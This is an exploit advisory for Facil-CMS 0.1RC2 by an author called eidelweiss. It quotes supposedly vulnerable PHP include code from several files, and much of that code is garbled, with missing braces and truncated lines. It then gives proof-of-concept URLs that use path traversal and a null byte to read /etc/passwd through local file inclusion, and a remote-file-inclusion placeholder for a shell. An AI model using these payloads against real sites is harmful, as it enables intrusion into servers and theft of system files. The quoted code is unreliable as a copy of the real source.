@@ -1,0 +1,81 @@
+########################################################
+	Facil-CMS (LFI/RFI) Vulnerability
+########################################################
+[+]Title	:	Facil-CMS Multiple Vulnerability
+[+]Version:	0.1RC2 
+[+]Download:	http://sourceforge.net/projects/facil-cms/files/
+[+]Author:	eidelweiss
+[+]Contact:	eidelweiss[at]cyberservices[dot]com		
+
+	[!]Thank`s To: all friends
+
+########################################################
+
+	-=[ Vuln C0de ]=-
+***********************
+[-]facil-cms/index.php
+
+ require_once('config.inc.php');
+ require_once(_FACIL_INCLUDES_PATH_ . '/facil-settings.php');
+ 
+ $config = new facilConfig();
+ $utils = new facilUtils();
+ 
+ if($utils->is_module($config->getSiteIndex()))
+
+require_once(_FACIL_MODULES_PATH_ . '/' . $config->getSiteIndex() . '/config.php');
+require_once(_FACIL_MODULES_PATH_ . '/' . $config->getSiteIndex() . '/class/index.php');
+
+***********************
+[-]facil-cms/modules.php
+
+require_once('config.inc.php');
+ require_once(_FACIL_INCLUDES_PATH_ . '/facil-settings.php');
+
+ if($_POST['modload'] && !eregi("/", $_POST['modload']))
+ {
+ 	$_MODLOAD = trim($_POST['modload']);
+ 	if($_POST['fileload'] && !eregi("/", $_POST['fileload']))
+ 	{
+ 		$FILELOAD = trim($_POST['fileload']);
+
+ 	$_MODLOAD = false;
+ 	$FILELOAD = false;
+
+ if($_POST['admload'] &&  !eregi("/", $_POST['admload']))
+ {
+ 	$_ADMLOAD = trim($_POST['admload']);
+ 	if($_POST['fileload'] && !eregi("/", $_POST['fileload']))
+
+
+ 	$_ADMLOAD = false;
+ 	$FILELOAD = false;
+
+	require_once(_FACIL_MODULES_PATH_ . '/' . $_MODLOAD . '/config.php');
+	require_once(_FACIL_MODULES_PATH_ . '/' . $_MODLOAD . '/class/index.php');
+
+*******************
+
+[-]facil-cms/includes/facil-settings.php
+
+if(!isset($_SESSION['FACIL_LANGUAGE']))
+ {
+ 	$_SESSION['FACIL_LANGUAGE'] = $config->getLanguage();
+ }
+ 
+ require_once(_FACIL_I18N_PATH_ . '/lang-' . $_SESSION['FACIL_LANGUAGE'] . '.php');
+ require_once(_FACIL_THEMES_PATH_ . '/' . $_SESSION['FACIL_THEME'] . '/themeFacil.class.php');
+
+*******************
+
+	-=[ Proof Of Concept ]=-
+
+	http://127.0.0.1/facil-cms/modules.php?modload=../../../../../../../../etc/passwd%00
+	Similar reference:
+	http://www.exploit-db.com/exploits/5792
+
+	http://127.0.0.1/facil-cms/index.php?getSiteIndex=../../../../../../../../etc/passwd%00
+
+	http://127.0.0.1/facil-cms//includes/facil-settings.php?FACIL_THEME= [rfi shell]
+
+########################################################
